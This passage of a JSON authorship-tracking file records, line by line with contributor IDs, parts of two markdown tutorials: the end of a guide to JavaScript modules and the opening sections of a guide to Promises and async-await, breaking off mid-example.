        "author": {
          "gitId": "openorclose"
        },
        "content": "anExampleNamespace.sumOfVariable(); // 3"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "openorclose"
        },
        "content": "A more in-depth explanation of the module pattern can be found in the [this course blog on mastering module pattern](https://ultimatecourses.com/blog/mastering-the-module-pattern)."
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Which to Use?"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "Although ES6 modules is the official way to implement modules, there are situations where you might have to use one of the other options. Here are some examples:"
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- If your application does not allow you to use a transpiler or a bundler (e.g. because of the additional overhead they add), you can use the module pattern via namespaces."
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- If your application is using Node.js, you might want to use CommonJS because Node.js only has experimental support for ES6 modules as of Node.js 13.8.0."
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How to Start?"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "openorclose"
        },
        "content": "You can use the module pattern right away by refactoring segments of your code into different files and wrapping your code in an IIFE."
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "openorclose"
        },
        "content": "If you are planning to use CommonJS or ES6 modules, you can start by refactoring segments of your code, but you will also need to be familiar with transpilers and bundlers such as Babel and Webpack."
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "## Further Reading"
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": "You can read more on JavaScript modules at following websites:"
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "- [JavaScript Modules: A Beginner’s Guide](https://medium.freecodecamp.org/javascript-modules-a-beginner-s-guide-783f7d7a5fcc) \u003cbr\u003e"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "This article gives a broad explanation of JavaScript modules, explaining different kinds of module system in JavaScript, yet easy to follow."
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": "- [JavaScript Modules: From IIFEs to CommonJS to ES6 Modules](https://tylermcginnis.com/javascript-modules-iifes-commonjs-esmodules/) \u003cbr\u003e"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "This article truly focuses on IIFE, CommonJS, and ES6 Modules, giving a very comprehensive usage example."
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "- [Learn the basics of the JavaScript module system and build your own library](https://medium.freecodecamp.org/anatomy-of-js-module-systems-and-building-libraries-fadcd8dbd0e) \u003cbr\u003e"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": "While the aim of the article may not be the same with the aim of this book article, this article gives a very comprehesive comparison between CommonJS and ES6 Modules."
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "openorclose"
        },
        "content": "- [Namespacing in Javascript](https://javascriptweblog.wordpress.com/2010/12/07/namespacing-in-javascript/)"
      }
    ],
    "authorContributionMap": {
      "openorclose": 34,
      "Tejas2805": 4,
      "jamessspanggg": 2,
      "-": 181
    }
  },
  {
    "path": "contents/javascript/Javascript-promises.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: \"Javascript: Promises\""
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Javascript: Promises"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Authors: Daniel Berzin Chua, Ong Shu Peng**\u003cbr/\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: Chelsey Ong, Damith C, Gilbert Emerson, Tan Heng Yeow"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "* [Why Promises?‎](#why-promises)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "* [What is a Promise?‎](#what-is-a-promise)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "* [How Promises Work‎](#how-promises-work)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "* [Imperative Style Promises: async-await‎](#imperative-style-promises-async-await)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "* [Where Promises can be used‎](#where-promises-can-be-used)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "* [Doing more with Promises‎](#doing-more-with-promises)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "* [Further Reading‎](#further-reading)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "## Why Promises?"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "Typically, code we write executes in _synchronous_ manner i.e., the current operation completes its work before proceeding with next operation. However, take an HTTP request for example. It is an operation that takes a while to process, depending on your internet speed and where you are in the world. If such an operation was to be executed in a synchronous manner, your application would be slow because it has to wait for this request to complete and it would not make for a particularly good user experience. Instead, we can make HTTP requests to operate *asynchronously* in order to improve the speed and user experience of your program. Asynchronous operations do not wait for their work to be finished before proceeding on with other operations; it allow those operations to continue processing in the background while other operations are executed. "
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "However, programming and debugging of asynchronous operations is more difficult compared to synchronous operations, because you would need some way to know when the operation has finished, or in the case of debugging, the point at which the operation is called. It can be especially confusing to trace the code since it may not run in the sequence that you would normally expect."
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "To illustrate this problem, we\u0027ll use `setTimeout()`: a function that has 3 parameters, a callback, a time (in milliseconds) to wait before the callback is executed, and an additional parameters to pass to the *callback*. A callback is a function that is passed as a parameter to another function, and it will be executed after that function finishes. `setTimeout()` is asynchronous as the code below it will execute while the timer is counting down, as you will see in the following code snippet."
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "You would probably expect `console.log(x)` to print `I have been updated` after 1 second has passed. Instead, it prints `I have not been updated.` Give it a try in Google Chrome\u0027s developer console."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "```javascript"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "var x \u003d \"I have not been updated\";"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "setTimeout(function (){"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "    x \u003d \"I have been updated\";"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "}, 1000);"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "console.log(x);"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "To fix this problem, we can simply shift the `console.log(x)` into the callback to get the expected result. It will now print the correct value."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "```javascript"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "var x \u003d \"I have not been updated\";"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "setTimeout(function (){"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "    x \u003d \"I have been updated\";"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "    console.log(x);"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "}, 1000);"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "However, this fix will only go so far. If we had another `setTimeout()` that depended on the result of the earlier `setTimeout()`, we would have to nest the functions within each other which would make for hard-to-read code as follows."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "```javascript"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "var x \u003d \"I have not been updated\";"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "setTimeout(function (){"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "    x \u003d \"I have been updated\";"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "    console.log(x);"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "    setTimeout(function () {"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "        x \u003d \"I have been updated 2 times.\";"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "        console.log(x);"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "        setTimeout(function () {"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "            x \u003d \"I have been updated 3 times.\";"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "            console.log(x);"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "            // and so on..."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "        }, 1000);"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "    }, 1000);"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "}, 1000);"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "This is what\u0027s infamously known as *callback hell*. It\u0027s a natural result of using too many callbacks, as this would result in the code becoming deeply nested. It would be difficult for anyone to read your code and to understand what exactly is going on."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "We can instead use Promises for cleaner code that would be easier to read, write and debug."
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "## What is a Promise?"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "The following example is adapted from [JavaScript Promises for Dummies](https://scotch.io/tutorials/javascript-promises-for-dummies)."
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "Promises in Javascript behave the same way as Promises do in real life. Imagine that your friend promises to return you money that you have lent him. At the time this promise was made, you would not know if your friend would really return your money. Your friend could either return your money on time, or he could just not do it."
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "These situations correspond to the 3 states of Promises in Javascript."
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "| State | Description |"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "| ------ | ----------- |"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "|Pending | You don\u0027t know if he would return your money. |"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "|Fulfilled | He returned your money. |"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "|Rejected | He refused to return your money. |"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "Promises provide the ability to specify how the execution of some part of your code would depend on the status of an asynchronous operation. It can now wait for the asynchronous operation to resolve first before doing any work on its result."
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "## How Promises Work "
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s learn how promises work by starting with an example that uses callbacks and converting it to use promises."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "Say we have two functions, `getData()` and `filterData()` which require some time to complete. You will have to get the data from some server using `getData()`, then process it using `filterData()`, before you can start displaying the results."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "How would such functions be implemented using the callback method? The callback method utilizes the fact that we can easily pass functions into javascript as parameters and then use them within the function, effectively \"passing\" any form of data out, without explicitly returning any value."
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "We will implement the above use case in the callback-style (mimicking the long return time of the functions using `setTimeout`):"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "```javascript"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "function executeWithDelay(val, callback) {"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "    // return val after a short wait"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "    setTimeout(function(){"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "        callback(val);"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "    }, 1000);"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "/** Delayed function calls **/"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "function getData(callback) {"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "    executeWithDelay(\u0027some random data\u0027, callback);"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "function filterData(data, callback) {"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "    executeWithDelay(data.split(\u0027 \u0027), callback);"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "function main() {"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "    getData(function(data){"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "        filterData(function(filtered){"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "            // will print array of splitted text"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "            console.log(filtered);"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "        })"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "    });"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "main();"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "Now we will rewrite all these using promises. We will be using the same function and variable names, to show how exactly promise compare to callbacks. "
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "```javascript"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "function executeWithDelay(val) {"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "    // return val after a short wait"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "    return new Promise(resolve \u003d\u003e {"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "        setTimeout(function(){"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "            resolve(val);"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "        }, 1000);"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "    });"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "/** note these functions now return a promise **/"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "function getdata() {"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "    return executeWithDelay(\u0027some random data\u0027);"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "function filterdata(data, callback) {"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "    return executeWithDelay(data.split(\u0027 \u0027));"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "function main() {"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "    return getData()"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "        .then(data \u003d\u003e filterData(data))"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "        .then(filtered \u003d\u003e console.log(filtered));"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "main();"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "## Imperative Style Promises: `async-await`"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "The example above uses `.then()` to pass data from one function to the next is often seen in *functional programming*. The original promise is passed from one `.then()` to the other, and with each `.then()`, a new promise is returned for the next `.then()` to work on."
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "That is somewhat different from the imperative programming style most programmers are more familiar with. The `async` and `await` keywords facilitate a imperative way of using promises."
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "Consider the `main` function from the previous example:"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "```javascript"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "function main() {"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "    return getData()"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "        .then(data \u003d\u003e filterData(data))"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "        .then(fltered \u003d\u003e console.log(filtered));"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "It can be rewritten in the async-await-style as follows:"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "```javascript"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "async function main() {"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "    const data \u003d await getData();"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "    const filtered \u003d await filterData(data);"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "    console.log(filtered);"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "    return filtered;"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "The `async` keyword ensures that the `main()` function returns a promise. In our case, this will cause `main()` to return a promise with `filtered` as its data. The information can then be used like so `main().then(filtered \u003d\u003e alert(filtered));`. "
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "Another interesting thing to note: `await` will wait for the promise to return before executing anything below. In this case, `console.log` will be executed after the two `await` calls, even when it doesn\u0027t depend on the results of those calls."
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "In the promise-style, we handle errors using the `.catch()` block. However when using the async-await-style, we handle the errors using the more conventional `try ... catch` block. These can be explored further in [here](https://javascript.info/async-await#error-handling)"
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Where Promises can be Used"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "Given below are some examples where JavaScript promises can be used:"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "* **HTTP Requests**"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "  Earlier in this chapter, HTTP requests were mentioned as an example of an asynchronous operation. By using Promises, you would be able to act on the result from the request without having to use callbacks or wait an arbitrarily set amount of time for the response to be returned."
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "  The following code sends a GET request to a URL and logs the body of the response using Promises. By using Promises instead of callbacks, we have clean code and improved performance as the code is able to run in the background."
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "  Code adapted from [Promise MDN docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "  ```javascript"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": "  function fetchPage(url) {"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "    return new Promise((resolve, reject) \u003d\u003e {"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "      const xhr \u003d new XMLHttpRequest();"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
